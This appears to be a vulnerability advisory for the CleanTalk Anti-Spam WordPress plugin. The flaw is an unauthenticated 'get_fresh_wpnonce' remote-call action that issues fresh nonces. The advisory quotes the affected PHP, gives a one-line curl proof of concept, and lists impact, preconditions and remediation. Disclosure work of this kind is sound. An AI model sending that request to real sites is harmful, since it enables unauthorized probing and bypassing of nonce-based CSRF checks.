# CTSP-001: Unauthenticated WP Nonce Generation via Remote Calls

## Severity: Medium (CVSS ~5.3)

## Summary

The CleanTalk Anti-Spam plugin's Remote Calls system exposes a `get_fresh_wpnonce` action that can be invoked by any unauthenticated remote user without providing a token, as long as the site has a valid CleanTalk API key configured (`key_is_ok === true`). This returns a fresh WordPress nonce that can be used to satisfy `X-WP-Nonce` checks on REST API endpoints.

## Affected Code

**File:** `lib/Cleantalk/ApbctWP/RemoteCalls.php`

### Entry Point (lines 45-54)

```php
public static function check()
{
    if ( Request::getString('spbc_remote_call_action') ) {
        return Request::getString('spbc_remote_call_token')
            ? self::checkWithToken()
            : self::checkWithoutToken();
    }
    return false;
}
```

### Token Bypass (lines 79-89)

```php
// todo Probably we still need to validate this, consult with analytics team
$is_wp_nonce_request = $apbct->key_is_ok
    && Request::get('spbc_remote_call_action') === 'get_fresh_wpnonce';

return $is_wp_nonce_request || $is_noc_request;
```

The developer's own TODO comment acknowledges this is unvalidated.

### Nonce Generation (lines 594-619)

```php
public static function action__get_fresh_wpnonce()
{
    // Only checks nonce_prev format: /^[a-f0-9]{10}$/
    // Does NOT verify nonce_prev is actually valid
    $nonce_name = apbct_settings__get_ajax_type() === 'rest'
        ? 'wp_rest'
        : AJAXService::$public_nonce_id;

    return TT::toString(json_encode(array(
        'wpnonce' => TT::toString(wp_create_nonce($nonce_name))
    )));
}
```

## Proof of Concept

```bash
curl -X POST "https://target-site.com/" \
  -d "spbc_remote_call_action=get_fresh_wpnonce" \
  -d "plugin_name=antispam" \
  -d "nonce_prev=0123456789"
```

Expected response:
```json
{"wpnonce":"a1b2c3d4e5"}
```

## Impact

- The generated nonce is for the anonymous user context (no session), so it does not grant admin privileges
- It can be used to satisfy `X-WP-Nonce` checks on REST endpoints that accept unauthenticated requests but still require a valid nonce
- Other CleanTalk REST endpoints (e.g., `/cleantalk-antispam/v1/alt_sessions`) verify nonces -- this endpoint provides a way to obtain them
- May interact with other plugins' REST endpoints that rely solely on nonce verification for CSRF protection without additional auth checks

## Preconditions

- Target site must have CleanTalk plugin active with a valid API key (`key_is_ok === true`)
- Site must use REST-mode AJAX (default in modern WordPress) to get a `wp_rest` nonce

## Remediation

Add token validation for the `get_fresh_wpnonce` action, or at minimum verify the `nonce_prev` parameter is a valid (not just well-formatted) nonce before issuing a fresh one.
